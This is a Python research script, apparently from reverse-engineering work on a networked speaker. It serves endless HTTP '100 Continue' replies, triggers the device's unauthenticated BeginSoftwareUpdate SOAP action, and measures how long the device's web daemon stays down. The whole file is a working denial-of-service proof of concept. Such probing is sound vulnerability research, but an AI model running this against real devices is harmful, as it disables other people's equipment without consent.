#!/usr/bin/env python3
"""D2 persistence probe: does the updater daemon stay down after the endless-100 socket closes?

D2 (docs/RE_WGET_FUZZ.md) showed the fetcher never returns while a server keeps answering
`HTTP/1.1 100 Continue`, and the player's HTTP daemon stays down for as long as the stream
continues. The open question is what happens *after* the attacker stops: if the daemon stays
down without the socket, the wedge outlives the attack; if it returns on EOF, the wedge is
bounded by stream lifetime.

Shape: serve endless 100 Continue, fire BeginSoftwareUpdate, sample /status until the daemon
is down, hold the stream HOLD seconds, close the socket and stop accepting, then keep
sampling for --after seconds. Prints a timeline and a verdict.

    python3 recon/wgetfuzz/d2_persist.py --ip 192.168.4.202 \
        --file captures/firmware/57.23-74170-1-16.upd --hold 30 --after 300
"""
import argparse
import socket
import subprocess
import threading
import time

BIND = "192.168.4.160"


def curl(args, timeout=3):
    return subprocess.run(["curl", "-s", "-m", str(timeout)] + args,
                          capture_output=True, text=True)


def http_ok(ip):
    return curl(["-o", "/dev/null", "-w", "%{http_code}",
                 f"http://{ip}:1400/status/VERSION"]).stdout.strip() == "200"


def soap(ip, action, params):
    body = (
        '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
        's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
        f'<u:{action} xmlns:u="urn:schemas-upnp-org:service:ZoneGroupTopology:1">'
        + "".join(f"<{k}>{v}</{k}>" for k, v in params.items())
        + f"</u:{action}></s:Body></s:Envelope>"
    )
    r = curl(["-o", "/dev/null", "-w", "%{http_code}", "-X", "POST",
              f"http://{ip}:1400/ZoneGroupTopology/Control",
              "-H", f'SOAPACTION: "urn:schemas-upnp-org:service:ZoneGroupTopology:1#{action}"',
              "-H", "Content-Type: text/xml", "--data-binary", body], timeout=8)
    return int(r.stdout.strip() or 0)


class HundredServer(threading.Thread):
    """Endless 100 Continue until close() is called."""

    daemon = True

    def __init__(self, bind, path):
        super().__init__()
        self.path = path
        self.srv = socket.socket()
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind((bind, 0))
        self.srv.listen(8)
        self.srv.settimeout(0.5)
        self.port = self.srv.getsockname()[1]
        self.conn = None
        self.requests = 0
        self.closed = threading.Event()

    def run(self):
        while not self.closed.is_set():
            try:
                conn, _ = self.srv.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            self.conn = conn
            self.requests += 1
            try:
                conn.recv(4096)
                while not self.closed.is_set():
                    conn.sendall(b"HTTP/1.1 100 Continue\r\n\r\n")
                    time.sleep(0.2)
            except OSError:
                pass

    def close(self):
        self.closed.set()
        try:
            self.srv.close()
        except OSError:
            pass
        try:
            if self.conn:
                self.conn.shutdown(socket.SHUT_RDWR)
                self.conn.close()
        except OSError:
            pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip", required=True)
    ap.add_argument("--file", required=True, help="genuine .upd (path name is what is served)")
    ap.add_argument("--bind", default=BIND)
    ap.add_argument("--hold", type=int, default=30, help="seconds to keep the stream after first down")
    ap.add_argument("--after", type=int, default=300, help="seconds to sample after the socket closes")
    args = ap.parse_args()

    if not http_ok(args.ip):
        print("VERDICT\n  unit not answering /status before the run")
        return 2

    name = "/" + args.file.rsplit("/", 1)[-1]
    srv = HundredServer(args.bind, name)
    srv.start()
    url = f"http://{args.bind}:{srv.port}{name}"
    print(f"serving {url}")

    t0 = time.time()
    fired = False
    for _ in range(4):
        if soap(args.ip, "BeginSoftwareUpdate",
                {"UpdateURL": url, "Flags": "0", "ExtraOptions": ""}) == 200:
            fired = True
            break
        time.sleep(5)
    if not fired:
        print("VERDICT\n  trigger failed (player busy)")
        return 2

    first_down = None
    close_at = None
    recovered_at = None
    last = None
    while True:
        time.sleep(2)
        now = time.time() - t0
        up = http_ok(args.ip)
        if up != last:
            print(f"  {now:6.1f}s  {'UP' if up else 'DOWN'}")
            last = up
        if not up and first_down is None:
            first_down = now
        if first_down is not None and close_at is None and now >= first_down + args.hold:
            srv.close()
            close_at = now
            print(f"  {now:6.1f}s  socket closed (requests={srv.requests})")
        if close_at is not None and up and recovered_at is None:
            recovered_at = now - close_at
            print(f"  {now:6.1f}s  recovered {recovered_at:.1f}s after close")
            break
        if close_at is not None and now >= close_at + args.after:
            break

    import re
    version = curl([f"http://{args.ip}:1400/status/VERSION"]).stdout
    m = re.search(r"'(\d+\.\d+-\d+)'", version)
    version = m.group(1) if m else "-"
    print("VERDICT")
    print(f"  requests          {srv.requests}")
    print(f"  first_down        {first_down if first_down else '-'}s")
    print(f"  socket_closed     {close_at if close_at else '-'}s")
    print(f"  recovered_after   {recovered_at if recovered_at is not None else 'NEVER'}s")
    print(f"  version           {version}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
